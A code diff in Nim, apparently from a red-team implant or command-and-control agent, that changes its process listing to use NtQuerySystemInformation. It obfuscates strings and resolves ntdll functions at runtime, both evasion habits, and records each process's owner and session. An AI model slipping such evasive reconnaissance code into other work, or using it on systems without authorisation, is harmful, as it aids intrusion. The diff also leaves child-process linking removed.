@@ -1,5 +1,4 @@
 import winim/lean 
-import winim/inc/tlhelp32
 import strutils, strformat, tables, algorithm
 import ../utils/io
 import ../../common/[types, utils]
@@ -11,37 +10,56 @@ type
         ppid*: DWORD 
         name*: string 
         user*: string
+        session*: ULONG
         children*: seq[DWORD]
 
-    # NtQuerySystemInformation = proc(systemInformationClass: SYSTEM_INFORMATION_CLASS, systemInformation: PVOID, systemInformationLength: ULONG, returnLength: PULONG): NTSTATUS {.stdcall.}
+    NtQuerySystemInformation = proc(systemInformationClass: SYSTEM_INFORMATION_CLASS, systemInformation: PVOID, systemInformationLength: ULONG, returnLength: PULONG): NTSTATUS {.stdcall.}
     NtOpenProcess = proc(hProcess: PHANDLE, desiredAccess: ACCESS_MASK, oa: PCOBJECT_ATTRIBUTES, clientId: PCLIENT_ID): NTSTATUS {.stdcall.}    
     NtOpenProcessToken = proc(processHandle: HANDLE, desiredAccess: ACCESS_MASK, tokenHandle: PHANDLE): NTSTATUS {.stdcall.}
-
-const PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000'i32
+    NtClose = proc(handle: HANDLE): NTSTATUS {.stdcall.}
 
 proc cmp*(x, y: ProcessInfo): int = 
     return cmp(x.pid, y.pid)
 
+#[
+    Retrieve snapshot of all currently running processes using NtQuerySystemInformation
+]#
+proc processSnapshot*(): PSYSTEM_PROCESS_INFORMATION = 
+    var
+        pSystemProcInfo: PSYSTEM_PROCESS_INFORMATION
+        status: NTSTATUS = 0
+        returnLength: ULONG = 0
+    
+    let pNtQuerySystemInformation = cast[NtQuerySystemInformation](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtQuerySystemInformation")))
+
+    # Retrieve returnLength and allocate sufficient memory
+    discard pNtQuerySystemInformation(systemProcessInformation, NULL, 0, addr returnLength)
+    pSystemProcInfo = cast[PSYSTEM_PROCESS_INFORMATION](LocalAlloc(LMEM_FIXED, returnLength))
+    if pSystemProcInfo == NULL:
+        raise newException(CatchableError, "1.2" & GetLastError().getError())
+    
+    # Retrieve system process information
+    status = pNtQuerySystemInformation(systemProcessInformation, cast[PVOID](pSystemProcInfo), returnLength, addr returnLength)
+    if status != STATUS_SUCCESS:
+        raise newException(CatchableError, "b" & status.getNtError())
+    
+    return pSystemProcInfo
+
+#[
+    Retrieve information about running processes
+]#
 proc processList*(): Table[DWORD, ProcessInfo] = 
     result = initTable[DWORD, ProcessInfo]() 
 
     # Take a snapshot of running processes
-    let hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
-    if hSnapshot == INVALID_HANDLE_VALUE: 
-        raise newException(CatchableError, GetLastError().getError)    
-    defer: CloseHandle(hSnapshot)
-
-    var pe32: PROCESSENTRY32
-    pe32.dwSize = DWORD(sizeof(PROCESSENTRY32))
-
-    # Loop over processes to fill the map            
-    if Process32First(hSnapshot, addr pe32) == FALSE:
-        raise newException(CatchableError, GetLastError().getError)
+    var sysProcessInfo = processSnapshot() 
+    defer: LocalFree(cast[HLOCAL](sysProcessInfo))
     
     let pNtOpenProcess = cast[NtOpenProcess](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtOpenProcess")))
     let pNtOpenProcessToken = cast[NtOpenProcessToken](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtOpenProcessToken")))
+    let pNtClose = cast[NtClose](GetProcAddress(GetModuleHandleA(protect("ntdll")), protect("NtClose")))
     
-    while Process32Next(hSnapshot, addr pe32): 
+    while true: 
         var 
             status: NTSTATUS
             hToken: HANDLE 
@@ -49,26 +67,35 @@ proc processList*(): Table[DWORD, ProcessInfo] =
             oa: OBJECT_ATTRIBUTES
             clientId: CLIENT_ID
         
-        var procInfo = ProcessInfo(
-            pid: pe32.th32ProcessID,
-            ppid: pe32.th32ParentProcessID,
-            name: $cast[WideCString](addr pe32.szExeFile[0]),
+        var 
+            pid = cast[DWORD](sysProcessInfo.UniqueProcessId)
+            ppid = cast[DWORD](sysProcessInfo.InheritedFromUniqueProcessId)
+
+        # Retrieve process information
+        result[pid] = ProcessInfo(
+            pid: pid,
+            ppid: ppid,
+            name: $sysProcessInfo.ImageName.Buffer,
+            session: sysProcessInfo.SessionId,
             children: @[]
         )
 
         # Retrieve user context    
         InitializeObjectAttributes(addr oa, NULL, 0, 0, NULL)
-        clientId.UniqueProcess = cast[HANDLE](pe32.th32ProcessID)
+        clientId.UniqueProcess = cast[HANDLE](pid)
         clientId.UniqueThread = 0
 
         status = pNtOpenProcess(addr hProcess, PROCESS_QUERY_INFORMATION, addr oa, addr clientId)
         if status == STATUS_SUCCESS and hProcess != 0: 
             status = pNtOpenProcessToken(hProcess, TOKEN_QUERY, addr hToken)
             if status == STATUS_SUCCESS and hToken != 0: 
-                procInfo.user = hToken.getTokenUser().username
-        
-        result[pe32.th32ProcessID] = procInfo
+                result[pid].user = hToken.getTokenUser().username
+        defer:
+            discard pNtClose(hProcess)
+            discard pNtClose(hToken)
 
-    for pid, procInfo in result.mpairs():
-        if result.contains(procInfo.ppid):
-            result[procInfo.ppid].children.add(pid)
+        # Move to next process
+        if sysProcessInfo.NextEntryOffset == 0: 
+            break
+            
+        sysProcessInfo = cast[PSYSTEM_PROCESS_INFORMATION](cast[ULONG_PTR](sysProcessInfo) + sysProcessInfo.NextEntryOffset)
